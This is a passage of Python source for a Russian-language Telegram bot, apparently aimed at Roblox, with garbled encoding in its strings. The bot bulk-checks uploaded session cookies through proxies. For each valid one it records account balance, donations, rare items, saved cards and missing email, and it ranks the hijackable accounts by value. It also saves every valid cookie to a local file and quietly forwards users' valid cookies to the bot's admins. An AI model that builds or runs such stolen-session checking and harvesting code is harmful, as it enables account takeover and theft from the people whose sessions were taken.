        Database.update_config(user_id, 'cookie_check_count', config['cookie_check_count'] + 1)
        Database.update_config(user_id, 'total_checks', config.get('total_checks', 0) + stats['valid'] + stats['invalid'])
        Database.update_config(user_id, 'valid_cookies_found', config.get('valid_cookies_found', 0) + stats['valid'])
        Database.update_config(user_id, 'invalid_cookies_found', config.get('invalid_cookies_found', 0) + stats['invalid'])
            
    except Exception as e:
        await message.answer(
            f"<b>‚ùå –û—à–∏–±–∫–∞ –≥–µ–Ω–µ—Ä–∞—Ü–∏–∏ –æ—Ç—á–µ—Ç–∞:</b>\n<code>{str(e)}</code>",
            parse_mode=ParseMode.HTML
        )
        logging.error(f"–û—à–∏–±–∫–∞ –≥–µ–Ω–µ—Ä–∞—Ü–∏–∏ –æ—Ç—á–µ—Ç–∞: {e}")

async def process_queue():
    global current_checking, active_tasks
    while True:
        if not check_queue.empty() and current_checking is None:
            current_checking = check_queue.get()
            user_id, file_info, message = current_checking
            start_time = time.time()  # –ó–∞–ø–∏—Å—ã–≤–∞–µ–º –≤—Ä–µ–º—è –Ω–∞—á–∞–ª–∞
            
            try:
                config = Database.get_user_config(user_id)
                badges = config.get('badges', [])
                gamepasses = config.get('gamepasses', [])
                proxies = Database.load_proxies()
                
                stats = {
                    'valid': 0,
                    'invalid': 0,
                    'duplicates': file_info.get('duplicates', 0),
                    'total_balance': 0,
                    'total_donate': 0,
                    'total_all_time_donate': 0,
                    'total_pending': 0,
                    'total_rap': 0,
                    'total_billing': defaultdict(float),
                    'premium': 0,
                    'total_cards': 0,
                    'badges_found': 0,
                    'gamepasses_found': 0,
                    'valid_list': [],
                    'balance_list': [],
                    'cards_list': [],
                    'all_time_donate_list': [],
                    'badges_list': [],
                    'gamepasses_list': [],
                    'pending_list': [],
                    'nomail_list': [],
                    'rap_list': [],
                    'rare_items_list': []
                }
                
                await message.edit_text(
                    "<b>‚è≥ –ù–∞—á–∏–Ω–∞—é –ø—Ä–æ–≤–µ—Ä–∫—É –∫—É–∫–∏... –≠—Ç–æ –º–æ–∂–µ—Ç –∑–∞–Ω—è—Ç—å –≤—Ä–µ–º—è.</b>\n\n"
                    f"<b>–í—Å–µ–≥–æ –∫—É–∫–∏:</b> {len(file_info['cookies'])}\n"
                    f"<b>–î—É–±–ª–∏–∫–∞—Ç–æ–≤ —É–¥–∞–ª–µ–Ω–æ:</b> {file_info.get('duplicates', 0)}\n"
                    f"<b>–ò—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –ø—Ä–æ–∫—Å–∏:</b> {len(proxies) if proxies else '–ù–µ—Ç'}",
                    parse_mode=ParseMode.HTML
                )
                
                async with aiohttp.ClientSession() as session:
                    tasks = []
                    for cookie in file_info['cookies']:
                        task = asyncio.create_task(
                            check_cookie_with_retry(session, cookie, badges, gamepasses, proxies)
                        )
                        tasks.append(task)
                        active_tasks.add(task)
                    
                    for i, future in enumerate(asyncio.as_completed(tasks)):
                        try:
                            result = await future
                            
                            if (i+1) % max(len(file_info['cookies'])//10, 10) == 0 or (i+1) == len(file_info['cookies']):
                                progress = (i+1)/len(file_info['cookies'])*100
                                await message.edit_text(
                                    f"<b>‚è≥ –ü—Ä–æ–≤–µ—Ä–∫–∞ –≤ –ø—Ä–æ—Ü–µ—Å—Å–µ...</b>\n\n"
                                    f"<b>–ü—Ä–æ–≥—Ä–µ—Å—Å:</b> {i+1}/{len(file_info['cookies'])} ({progress:.1f}%)\n"
                                    f"<b>–í–∞–ª–∏–¥–Ω—ã—Ö:</b> {stats['valid']}\n"
                                    f"<b>–ù–µ–≤–∞–ª–∏–¥–Ω—ã—Ö:</b> {stats['invalid']}",
                                    parse_mode=ParseMode.HTML
                                )
                            
                            if result['status'] == 'valid':
                                stats['valid'] += 1
                                stats['total_balance'] += result['balance']
                                stats['total_donate'] += result['donate']
                                stats['total_all_time_donate'] += result['all_time_donate']
                                stats['total_pending'] += result['pending']
                                stats['total_rap'] += result['rap']

                                billing = result.get('billing', 'error')
                                if billing != 'error':
                                    try:
                                        amount, currency = billing.split()
                                        stats['total_billing'][currency] += float(amount)
                                    except Exception as e:
                                        logging.error(f"–û—à–∏–±–∫–∞ –æ–±—Ä–∞–±–æ—Ç–∫–∏ –±–∏–ª–ª–∏–Ω–≥–∞: {e}")
                                if result['premium']:
                                    stats['premium'] += 1
                                if result['card']:
                                    stats['total_cards'] += 1
                                    stats['cards_list'].append(result)
                                if result['badges']:
                                    stats['badges_found'] += len(result['badges'])
                                    stats['badges_list'].append(result)
                                if result['gamepasses']:
                                    stats['gamepasses_found'] += len(result['gamepasses'])
                                    stats['gamepasses_list'].append(result)
                                if result['pending'] > 0:
                                    stats['pending_list'].append(result)
                                if not result['email']:
                                    stats['nomail_list'].append(result)
                                if result['rap'] > 0:
                                    stats['rap_list'].append(result)
                                if result['rare_items']:
                                    stats['rare_items_list'].append(result)
                                print(result)
                                if int(result['all_time_donate']) > 0:
                                    stats['all_time_donate_list'].append(result)
                                if result['balance'] > 0:
                                    stats['balance_list'].append(result)
                                stats['valid_list'].append(result)

                                valid_cookies = set()
                                if os.path.exists('all_valid_cookies.txt'):
                                    with open('all_valid_cookies.txt', 'r', encoding='utf-8') as f:
                                        valid_cookies.update(line.strip() for line in f if line.strip())
                                
                                if result['cookie'] not in valid_cookies:
                                    with open('all_valid_cookies.txt', 'a', encoding='utf-8') as f:
                                        f.write(result['cookie'] + '\n')
                            else:
                                stats['invalid'] += 1
                        except asyncio.CancelledError:
                            logging.info(f"–ü—Ä–æ–≤–µ—Ä–∫–∞ –∫—É–∫–∏ –æ—Ç–º–µ–Ω–µ–Ω–∞ –¥–ª—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è {user_id}")
                            await message.edit_text(
                                "<b>‚ùå –ü—Ä–æ–≤–µ—Ä–∫–∞ –æ—Ç–º–µ–Ω–µ–Ω–∞ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–æ–º</b>\n\n"
                                "–í—Å–µ —Ç–µ–∫—É—â–∏–µ –ø—Ä–æ–≤–µ—Ä–∫–∏ –±—ã–ª–∏ –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω—ã.",
                                parse_mode=ParseMode.HTML
                            )
                            break
                        except Exception as e:
                            logging.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø—Ä–æ–≤–µ—Ä–∫–µ –∫—É–∫–∏: {e}")
                            stats['invalid'] += 1
                        finally:
                            if future in active_tasks:
                                active_tasks.remove(future)
                
                if stats['valid'] > 0:
                    await generate_report(stats, user_id, message, start_time)
                else:
                    await message.edit_text(
                        "<b>‚ùå –í —Ñ–∞–π–ª–µ –Ω–µ –Ω–∞–π–¥–µ–Ω–æ –≤–∞–ª–∏–¥–Ω—ã—Ö cookies. –ü—Ä–æ–≤–µ—Ä—å—Ç–µ —Ñ–æ—Ä–º–∞—Ç —Ñ–∞–π–ª–∞.</b>",
                        parse_mode=ParseMode.HTML
                    )
                
            except asyncio.CancelledError:
                await message.edit_text(
                    "<b>‚ùå –ü—Ä–æ–≤–µ—Ä–∫–∞ –æ—Ç–º–µ–Ω–µ–Ω–∞ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–æ–º</b>\n\n"
                    "–í—Å–µ —Ç–µ–∫—É—â–∏–µ –ø—Ä–æ–≤–µ—Ä–∫–∏ –±—ã–ª–∏ –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω—ã.",
                    parse_mode=ParseMode.HTML
                )
            except Exception as e:
                await message.edit_text(
                    f"<b>‚ùå –û—à–∏–±–∫–∞ –æ–±—Ä–∞–±–æ—Ç–∫–∏ –∫—É–∫–∏:</b>\n<code>{str(e)}</code>",
                    parse_mode=ParseMode.HTML
                )
                logging.error(f"–û—à–∏–±–∫–∞ –æ–±—Ä–∞–±–æ—Ç–∫–∏ –∫—É–∫–∏: {e}")
            finally:
                current_checking = None
                queue_status.pop(user_id, None)
                sent_queue_notifications.pop(user_id, None)
                await notify_queue_update()
        
        await asyncio.sleep(1)

async def notify_queue_update():
    global sent_queue_notifications
    
    temp_queue = list(check_queue.queue)
    current_positions = {}
    
    for idx, (user_id, _, _) in enumerate(temp_queue, start=1):
        current_positions[user_id] = idx
    
    for user_id in list(sent_queue_notifications.keys()):
        if user_id not in current_positions:
            sent_queue_notifications.pop(user_id, None)
    
    for user_id, position in current_positions.items():
        last_notified_position = sent_queue_notifications.get(user_id, 0)
        
        if (position != last_notified_position or 
            user_id not in sent_queue_notifications or
            position == 1):
            
            try:
                if position == 1:
                    msg = (
                        "<b>üìä –í–ê–®–ê –û–ß–ï–†–ï–î–¨</b>\n\n"
                        "ÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπå\n"
                        "üå¥ –í–∞—à —Ñ–∞–π–ª —Å–ª–µ–¥—É—é—â–∏–π –≤ –æ—á–µ—Ä–µ–¥–∏ –Ω–∞ –ø—Ä–æ–≤–µ—Ä–∫—É!\n\n"
                        "üå¥ –ù–∞—á–∏–Ω–∞–µ–º –ø—Ä–æ–≤–µ—Ä–∫—É –≤ –±–ª–∏–∂–∞–π—à–∏–µ —Å–µ–∫—É–Ω–¥—ã..."
                    )
                else:
                    msg = (
                        f"<b>üìä –í–ê–®–ê –û–ß–ï–†–ï–î–¨ (–ü–æ–∑–∏—Ü–∏—è: {position})</b>\n\n"
                        "ÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπå\n"
                        f"üå¥ –í–∞—à —Ñ–∞–π–ª –≤ –æ—á–µ—Ä–µ–¥–∏ –Ω–∞ –ø—Ä–æ–≤–µ—Ä–∫—É.\n"
                        f"üí§ –ü—Ä–∏–º–µ—Ä–Ω–æ–µ –≤—Ä–µ–º—è –æ–∂–∏–¥–∞–Ω–∏—è: <b>{position * 2}-{position * 5} –º–∏–Ω—É—Ç</b>\n\n"
                        "ü©∏ –°—Ç–∞—Ç—É—Å –æ–±–Ω–æ–≤–ª—è–µ—Ç—Å—è –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏."
                    )
                
                await bot.send_message(
                    chat_id=user_id,
                    text=msg,
                    parse_mode=ParseMode.HTML
                )
                
                sent_queue_notifications[user_id] = position
                
            except Exception as e:
                logging.error(f"–û—à–∏–±–∫–∞ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è {user_id}: {e}")
                sent_queue_notifications.pop(user_id, None)

async def notify_validator_queue_update():
    global validator_sent_notifications
    
    temp_queue = list(validator_queue.queue)
    current_positions = {}
    
    for idx, (user_id, _, _) in enumerate(temp_queue, start=1):
        current_positions[user_id] = idx
    
    for user_id in list(validator_sent_notifications.keys()):
        if user_id not in current_positions:
            validator_sent_notifications.pop(user_id, None)
    
    for user_id, position in current_positions.items():
        last_notified_position = validator_sent_notifications.get(user_id, 0)
        
        if (position != last_notified_position or 
            user_id not in validator_sent_notifications or
            position == 1):
            
            try:
                if position == 1:
                    msg = (
                        "<b>üìä –í–ê–®–ê –û–ß–ï–†–ï–î–¨ –í –í–ê–õ–ò–î–ê–¢–û–†–ï</b>\n\n"
                        "ÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπå\n"
                        "üå¥ –í–∞—à —Ñ–∞–π–ª —Å–ª–µ–¥—É—é—â–∏–π –≤ –æ—á–µ—Ä–µ–¥–∏ –Ω–∞ –ø—Ä–æ–≤–µ—Ä–∫—É!\n\n"
                        "üå¥ –ù–∞—á–∏–Ω–∞–µ–º –ø—Ä–æ–≤–µ—Ä–∫—É –≤ –±–ª–∏–∂–∞–π—à–∏–µ —Å–µ–∫—É–Ω–¥—ã..."
                    )
                else:
                    msg = (
                        f"<b>üìä –í–ê–®–ê –û–ß–ï–†–ï–î–¨ –í –í–ê–õ–ò–î–ê–¢–û–†–ï (–ü–æ–∑–∏—Ü–∏—è: {position})</b>\n\n"
                        "ÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπå\n"
                        f"üå¥ –í–∞—à —Ñ–∞–π–ª –≤ –æ—á–µ—Ä–µ–¥–∏ –Ω–∞ –ø—Ä–æ–≤–µ—Ä–∫—É.\n"
                        f"üí§ –ü—Ä–∏–º–µ—Ä–Ω–æ–µ –≤—Ä–µ–º—è –æ–∂–∏–¥–∞–Ω–∏—è: <b>{position * 2}-{position * 5} –º–∏–Ω—É—Ç</b>\n\n"
                        "üîÑ –°—Ç–∞—Ç—É—Å –æ–±–Ω–æ–≤–ª—è–µ—Ç—Å—è –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏."
                    )
                
                await bot.send_message(
                    chat_id=user_id,
                    text=msg,
                    parse_mode=ParseMode.HTML
                )
                
                validator_sent_notifications[user_id] = position
                
            except Exception as e:
                logging.error(f"–û—à–∏–±–∫–∞ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è {user_id} –≤ –≤–∞–ª–∏–¥–∞—Ç–æ—Ä–µ: {e}")
                validator_sent_notifications.pop(user_id, None)

async def process_validator_queue():
    global current_validator_checking, validator_active_tasks
    while True:
        if not validator_queue.empty() and current_validator_checking is None:
            current_validator_checking = validator_queue.get()
            user_id, file_info, message = current_validator_checking
            start_time = time.time()
            
            try:
                proxies = Database.load_proxies()
                
                stats = {
                    'valid': 0,
                    'invalid': 0,
                    'duplicates': file_info.get('duplicates', 0),
                    'valid_cookies': []
                }
                
                await message.edit_text(
                    "<b>‚è≥ –ù–∞—á–∏–Ω–∞—é –ø—Ä–æ–≤–µ—Ä–∫—É –∫—É–∫–∏ –≤ –≤–∞–ª–∏–¥–∞—Ç–æ—Ä–µ...</b>\n\n"
                    f"<b>–í—Å–µ–≥–æ –∫—É–∫–∏:</b> {len(file_info['cookies'])}\n"
                    f"<b>–î—É–±–ª–∏–∫–∞—Ç–æ–≤ —É–¥–∞–ª–µ–Ω–æ:</b> {file_info.get('duplicates', 0)}\n"
                    f"<b>–ò—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –ø—Ä–æ–∫—Å–∏:</b> {len(proxies) if proxies else '–ù–µ—Ç'}",
                    parse_mode=ParseMode.HTML
                )
                
                async with aiohttp.ClientSession() as session:
                    tasks = []
                    for cookie in file_info['cookies']:
                        task = asyncio.create_task(
                            check_cookie_simple(session, cookie, proxies)
                        )
                        tasks.append(task)
                        validator_active_tasks.add(task)
                    
                    for i, future in enumerate(asyncio.as_completed(tasks)):
                        try:
                            result = await future
                            
                            if (i+1) % max(len(file_info['cookies'])//10, 10) == 0 or (i+1) == len(file_info['cookies']):
                                progress = (i+1)/len(file_info['cookies'])*100
                                await message.edit_text(
                                    f"<b>‚è≥ –ü—Ä–æ–≤–µ—Ä–∫–∞ –≤ –ø—Ä–æ—Ü–µ—Å—Å–µ...</b>\n\n"
                                    f"<b>–ü—Ä–æ–≥—Ä–µ—Å—Å:</b> {i+1}/{len(file_info['cookies'])} ({progress:.1f}%)\n"
                                    f"<b>–í–∞–ª–∏–¥–Ω—ã—Ö:</b> {stats['valid']}\n"
                                    f"<b>–ù–µ–≤–∞–ª–∏–¥–Ω—ã—Ö:</b> {stats['invalid']}",
                                    parse_mode=ParseMode.HTML
                                )
                            
                            if result['status'] == 'valid':
                                stats['valid'] += 1
                                stats['valid_cookies'].append(result['cookie'])
                            else:
                                stats['invalid'] += 1
                        except asyncio.CancelledError:
                            logging.info(f"–ü—Ä–æ–≤–µ—Ä–∫–∞ –≤ –≤–∞–ª–∏–¥–∞—Ç–æ—Ä–µ –æ—Ç–º–µ–Ω–µ–Ω–∞ –¥–ª—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è {user_id}")
                            await message.edit_text(
                                "<b>‚ùå –ü—Ä–æ–≤–µ—Ä–∫–∞ –æ—Ç–º–µ–Ω–µ–Ω–∞</b>",
                                parse_mode=ParseMode.HTML
                            )
                            break
                        except Exception as e:
                            logging.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø—Ä–æ–≤–µ—Ä–∫–µ –∫—É–∫–∏ –≤ –≤–∞–ª–∏–¥–∞—Ç–æ—Ä–µ: {e}")
                            stats['invalid'] += 1
                        finally:
                            if future in validator_active_tasks:
                                validator_active_tasks.remove(future)
                       
                
                if stats['valid'] > 0:
                    # –°–æ—Ö—Ä–∞–Ω—è–µ–º –≤–∞–ª–∏–¥–Ω—ã–µ –∫—É–∫–∏ –≤ —Ñ–∞–π–ª Valid.txt
                    valid_file_path = f"{COOKIE_FILES_DIR}Valid.txt"
                    with open(valid_file_path, 'w') as f:
                        f.write('\n'.join(stats['valid_cookies']))
                    
                    # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Ä–µ–∑—É–ª—å—Ç–∞—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é
                    result_text = (
                        f"<b>üå¥–†–µ–∑—É–ª—å—Ç–∞—Ç –ø—Ä–æ–≤–µ—Ä–∫–∏ –∫—É–∫–∏üå¥</b>\n\n"
                        f"ÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπå\n"
                        f"[‚úÖ] ‚Ä¢ –í–∞–ª–∏–¥–Ω—ã–µ: <b>{stats['valid']}</b>\n"
                        f"[üö´] ‚Ä¢ –ù–µ–≤–∞–ª–∏–¥–Ω—ã–µ: <b>{stats['invalid']}</b>\n"
                        f"[‚ôªÔ∏è] ‚Ä¢ –î—É–±–ª–∏–∫–∞—Ç–æ–≤: <b>{stats['duplicates']}</b>\n\n"
                        f"<b>–ü—Ä–æ–≤–µ—Ä–∫–∞ —É—Å–ø–µ—à–Ω–æ –∑–∞–≤–µ—Ä—à–µ–Ω–∞</b>"
                    )
                    
                    await message.answer_document(
                        document=FSInputFile(valid_file_path),
                        caption=result_text,
                        parse_mode=ParseMode.HTML
                    )
                    
                    # –£–¥–∞–ª—è–µ–º –≤—Ä–µ–º–µ–Ω–Ω—ã–π —Ñ–∞–π–ª –ø–æ—Å–ª–µ –æ—Ç–ø—Ä–∞–≤–∫–∏
                    if os.path.exists(valid_file_path):
                        os.remove(valid_file_path)
                    
                    # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –∞–¥–º–∏–Ω–∞–º
                    if user_id not in ADMINS: 
                        user = await bot.get_chat(user_id)
                        username = user.username if user.username else "–ù–µ—Ç username"
                        timestamp = datetime.now().strftime("%d%m%Y%H%M%S")
                        admin_report = (
                            f'üå¥<b>–ù–û–í–ê–Ø –ü–†–û–í–ï–†–ö–ê –í –í–ê–õ–ò–î–ê–¢–û–†–ï</b>\n\n'
                            f'ÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπå\n'
                            f'üë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: @{username} (ID: {user_id})\n\n'
                            f'[‚úÖ] ‚Ä¢ –í–∞–ª–∏–¥–Ω—ã–µ: <b>{stats["valid"]}</b>\n'
                            f'[üö´] ‚Ä¢ –ù–µ–≤–∞–ª–∏–¥–Ω—ã–µ: <b>{stats["invalid"]}</b>\n'
                            f'[‚ôªÔ∏è] ‚Ä¢ –î—É–±–ª–∏–∫–∞—Ç–æ–≤: <b>{stats["duplicates"]}</b>'
                        )
                        
                        # –°–æ–∑–¥–∞–µ–º –≤—Ä–µ–º–µ–Ω–Ω—ã–π —Ñ–∞–π–ª –¥–ª—è –∞–¥–º–∏–Ω–æ–≤
                        admin_file_path = f"{COOKIE_FILES_DIR}Valid.txt"
                        with open(admin_file_path, 'w') as f:
                            f.write('\n'.join(stats['valid_cookies']))
                        
                        for admin_id in ADMINS:
                            try:
                                await bot.send_document(
                                    chat_id=admin_id,
                                    document=FSInputFile(admin_file_path),
                                    caption=admin_report,
                                    parse_mode=ParseMode.HTML
                                )
                            except Exception as e:
                                logging.error(f"–ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –æ—Ç—á–µ—Ç –∞–¥–º–∏–Ω—É {admin_id}: {e}")
                        
                        os.remove(admin_file_path)
                    
                else:
                    await message.edit_text(
                        "<b>‚ùå –í —Ñ–∞–π–ª–µ –Ω–µ –Ω–∞–π–¥–µ–Ω–æ –≤–∞–ª–∏–¥–Ω—ã—Ö cookies. –ü—Ä–æ–≤–µ—Ä—å—Ç–µ —Ñ–æ—Ä–º–∞—Ç —Ñ–∞–π–ª–∞.</b>",
                        parse_mode=ParseMode.HTML
                    )
                
            except asyncio.CancelledError:
                await message.edit_text(
                    "<b>‚ùå –ü—Ä–æ–≤–µ—Ä–∫–∞ –æ—Ç–º–µ–Ω–µ–Ω–∞</b>",
                    parse_mode=ParseMode.HTML
                )
            except Exception as e:
                await message.edit_text(
                    f"<b>‚ùå –û—à–∏–±–∫–∞ –æ–±—Ä–∞–±–æ—Ç–∫–∏ –∫—É–∫–∏:</b>\n<code>{str(e)}</code>",
                    parse_mode=ParseMode.HTML
                )
                logging.error(f"–û—à–∏–±–∫–∞ –æ–±—Ä–∞–±–æ—Ç–∫–∏ –∫—É–∫–∏ –≤ –≤–∞–ª–∏–¥–∞—Ç–æ—Ä–µ: {e}")
            finally:
                current_validator_checking = None
                validator_queue_status.pop(user_id, None)
                validator_sent_notifications.pop(user_id, None)
        
        await asyncio.sleep(1)

@router.message(Command("restart"))
async def restart_bot(message: Message):
    if message.from_user.id not in ADMINS:
        await message.answer("‚ùå –£ –≤–∞—Å –Ω–µ—Ç –ø—Ä–∞–≤ –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è —ç—Ç–æ–π –∫–æ–º–∞–Ω–¥—ã", parse_mode=ParseMode.HTML)
        return
    
    try:
        await message.answer("üîÑ –û—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞—é –≤—Å–µ —Ç–µ–∫—É—â–∏–µ –ø—Ä–æ–≤–µ—Ä–∫–∏...", parse_mode=ParseMode.HTML)
        
        global check_queue, current_checking, active_tasks, queue_task
        global validator_queue, current_validator_checking, validator_active_tasks, validator_task
        
        # –û—á–∏—â–∞–µ–º –æ–±–µ –æ—á–µ—Ä–µ–¥–∏
        with check_queue.mutex:
            check_queue.queue.clear()
        with validator_queue.mutex:
            validator_queue.queue.clear()
        
        # –û—Ç–º–µ–Ω—è–µ–º —Ç–µ–∫—É—â–∏–µ –ø—Ä–æ–≤–µ—Ä–∫–∏
        if current_checking:
            _, _, msg = current_checking
            try:
                await msg.edit_text("<b>‚ùå –ü—Ä–æ–≤–µ—Ä–∫–∞ –æ—Ç–º–µ–Ω–µ–Ω–∞ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–æ–º</b>", parse_mode=ParseMode.HTML)
            except Exception as e:
                logging.error(f"–û—à–∏–±–∫–∞ —Ä–µ–¥–∞–∫—Ç–∏—Ä–æ–≤–∞–Ω–∏—è —Å–æ–æ–±—â–µ–Ω–∏—è: {e}")
            current_checking = None

        if current_validator_checking:
            _, _, msg = current_validator_checking
            try:
                await msg.edit_text("<b>‚ùå –ü—Ä–æ–≤–µ—Ä–∫–∞ –æ—Ç–º–µ–Ω–µ–Ω–∞ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–æ–º</b>", parse_mode=ParseMode.HTML)
            except Exception as e:
                logging.error(f"–û—à–∏–±–∫–∞ —Ä–µ–¥–∞–∫—Ç–∏—Ä–æ–≤–∞–Ω–∏—è —Å–æ–æ–±—â–µ–Ω–∏—è –≤–∞–ª–∏–¥–∞—Ç–æ—Ä–∞: {e}")
            current_validator_checking = None

        # –û—Ç–º–µ–Ω—è–µ–º –≤—Å–µ –∞–∫—Ç–∏–≤–Ω—ã–µ –∑–∞–¥–∞—á–∏
        tasks_to_cancel = list(active_tasks) + list(validator_active_tasks)
        for task in tasks_to_cancel:
            task.cancel()
            try:
                await task
            except asyncio.CancelledError:
                pass
            except Exception as e:
                logging.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–º–µ–Ω–µ –∑–∞–¥–∞—á–∏: {e}")
        active_tasks.clear()
        validator_active_tasks.clear()

        # –°–±—Ä–∞—Å—ã–≤–∞–µ–º —Å—Ç–∞—Ç—É—Å—ã –æ–±–µ–∏—Ö –æ—á–µ—Ä–µ–¥–µ–π
        queue_status.clear()
        sent_queue_notifications.clear()
        validator_queue_status.clear()
        validator_sent_notifications.clear()

        # –ü–µ—Ä–µ–∑–∞–ø—É—Å–∫–∞–µ–º –æ–±—Ä–∞–±–æ—Ç—á–∏–∫–∏ –æ—á–µ—Ä–µ–¥–µ–π
        queue_task = asyncio.create_task(process_queue())
        active_tasks.add(queue_task)
        
        validator_task = asyncio.create_task(process_validator_queue())
        validator_active_tasks.add(validator_task)

        # –£–≤–µ–¥–æ–º–ª—è–µ–º –≤—Å–µ—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π –≤ –æ—á–µ—Ä–µ–¥—è—Ö
        users_to_notify = set(queue_status.keys()).union(set(validator_queue_status.keys()))
        for user_id in users_to_notify:
            try:
                await bot.send_message(
                    user_id,
                    "üîÑ –í—Å–µ —Ç–µ–∫—É—â–∏–µ –ø—Ä–æ–≤–µ—Ä–∫–∏ –±—ã–ª–∏ –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω—ã –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–æ–º.\n"
                    "–í—ã –º–æ–∂–µ—Ç–µ –æ—Ç–ø—Ä–∞–≤–∏—Ç—å —Ñ–∞–π–ª —Å –∫—É–∫–∞–º–∏ –∑–∞–Ω–æ–≤–æ –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏."
                )
            except Exception as e:
                logging.error(f"–ù–µ —É–¥–∞–ª–æ—Å—å —É–≤–µ–¥–æ–º–∏—Ç—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è {user_id}: {e}")

        await message.answer("‚úÖ –í—Å–µ –ø—Ä–æ–≤–µ—Ä–∫–∏ —É—Å–ø–µ—à–Ω–æ –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω—ã. –û—á–µ—Ä–µ–¥–∏ –æ—á–∏—â–µ–Ω—ã.", parse_mode=ParseMode.HTML)
        
    except Exception as e:
        logging.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Å—Ç–∞–Ω–æ–≤–∫–µ –ø—Ä–æ–≤–µ—Ä–æ–∫: {e}")
        await message.answer(f"‚ùå –û—à–∏–±–∫–∞ –æ—Å—Ç–∞–Ω–æ–≤–∫–∏ –ø—Ä–æ–≤–µ—Ä–æ–∫: {str(e)}", parse_mode=ParseMode.HTML)

@router.message(Command("start"))
async def cmd_start(message: Message, state: FSMContext):
    user_id = message.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await message.answer(
            f"<b>‚ùå –í–´ –ó–ê–ë–õ–û–ö–ò–†–û–í–ê–ù–´</b>\n\n"
            f"ÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπåÔπå\n"
            f"–ü—Ä–∏—á–∏–Ω–∞ –±–ª–æ–∫–∏—Ä–æ–≤–∫–∏: <b>{reason}</b>\n\n"
            f"–ï—Å–ª–∏ –≤—ã —Å—á–∏—Ç–∞–µ—Ç–µ, —á—Ç–æ —ç—Ç–æ –æ—à–∏–±–∫–∞, —Å–≤—è–∂–∏—Ç–µ—Å—å —Å –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–æ–º.",
            parse_mode=ParseMode.HTML
        )
        return
    
    await state.clear()
    _, is_new = Database.register_user(user_id, message.from_user.username)

    # –£–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –∞–¥–º–∏–Ω–æ–≤ —Ç–æ–ª—å–∫–æ –¥–ª—è –Ω–æ–≤—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π
    if is_new:
        for admin_id in ADMINS:
            try:
                await bot.send_message(
                    admin_id,
                    f'üÜï –ù–æ–≤—ã–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: ID {user_id} (@{message.from_user.username or "–Ω–µ—Ç username"})'
                )
            except Exception as e:
                logging.error(f"–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –∞–¥–º–∏–Ω—É {admin_id}: {e}")
    
    # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –ø—Ä–∏–≤–µ—Ç—Å—Ç–≤–µ–Ω–Ω–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ –í–°–ï–ú –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è–º
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="ü©∏ –ü—Ä–æ–≤–µ—Ä–∏—Ç—å Cookie ü©∏", callback_data="cookie_check"),
         InlineKeyboardButton(text="ü´¶ –ü—Ä–æ—Ñ–∏–ª—å ü´¶", callback_data="profile")],
